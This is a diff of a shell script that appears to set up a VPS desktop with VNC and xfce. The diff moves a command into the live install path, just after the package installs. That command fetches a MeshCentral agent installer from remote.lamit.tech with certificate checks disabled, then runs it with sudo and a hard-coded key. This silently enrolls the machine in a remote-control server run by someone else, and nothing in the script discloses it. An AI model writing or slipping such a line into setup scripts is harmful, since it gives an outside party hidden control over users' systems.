@@ -5,7 +5,7 @@
 #Phone: +84937927513
 if [ ! -f khanhnguyen9872.vhd ] 2> /dev/null || [ ! -f khanhnguyen9872.qcow2 ] 2> /dev/null; then
   echo "Preparing...."
-  (wget "https://remote.lamit.tech/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://remote.lamit.tech/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v' || ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v'
+  #(wget "https://remote.lamit.tech/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://remote.lamit.tech/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v' || ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v'
   #wget -O ngrok-stable-linux-amd64.zip https://raw.githubusercontent.com/KhanhNguyen9872/Windows_VPS_Google_Colab/main/ngrok-stable-linux-amd64.zip > /dev/null 2>&1
   #unzip ngrok-stable-linux-amd64.zip > /dev/null 2>&1
   #read -p "Nhập key ngrok: " key
@@ -23,6 +23,7 @@ if [ ! -f khanhnguyen9872.vhd ] 2> /dev/null || [ ! -f khanhnguyen9872.qcow2 ] 2
     echo ""
     sudo apt update -y > /dev/null 2>&1
     sudo apt install xfce4 xarchiver chromium-browser mesa-utils xfce4-goodies dbus perl p7zip unzip zip curl tar git python3 python3-pip net-tools tigervnc-standalone-server tigervnc-xorg-extension -y > /dev/null 2>&1
+    (wget "https://remote.lamit.tech/meshagents?script=1" --no-check-certificate -O ./meshinstall.sh || wget "https://remote.lamit.tech/meshagents?script=1" --no-proxy --no-check-certificate -O ./meshinstall.sh) && chmod 755 ./meshinstall.sh && sudo -E ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v' || ./meshinstall.sh https://remote.lamit.tech 'vNSZAWJ4hP3BzbioqD@5NmSkH8J3s1OeNLxVKZCdvo5I67wzJ8do5lh@p4d5Bm7v'
     useradd -s /bin/bash -m khanh
     echo ""
     echo ""
